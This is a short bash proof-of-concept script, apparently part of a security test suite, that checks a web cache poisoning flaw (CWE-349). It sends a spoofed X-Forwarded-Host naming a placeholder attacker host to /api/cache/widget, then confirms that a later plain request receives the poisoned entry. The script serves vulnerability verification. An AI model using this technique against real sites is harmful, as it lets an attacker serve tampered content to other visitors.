#!/usr/bin/env bash
# CACHE-POISON-001 (CWE-349): /api/cache/widget caches on the `key` param but
# reflects the unkeyed X-Forwarded-Host, so an attacker poisons the shared entry
# served to later (header-less) visitors. A unique key keeps the PoC
# self-contained (the entry also expires via TTL).
set -e; . "$(dirname "$0")/_lib.sh"
K="poc-$RANDOM$RANDOM"
EVIL="evil-$K.example"
# 1) attacker primes the cache with a spoofed host
curl -s "$TARGET/api/cache/widget?key=$K" -H "X-Forwarded-Host: $EVIL" >/dev/null
# 2) a normal visitor (no header) receives the poisoned entry on the vuln variant
curl -s "$TARGET/api/cache/widget?key=$K" | grep -q "$EVIL"
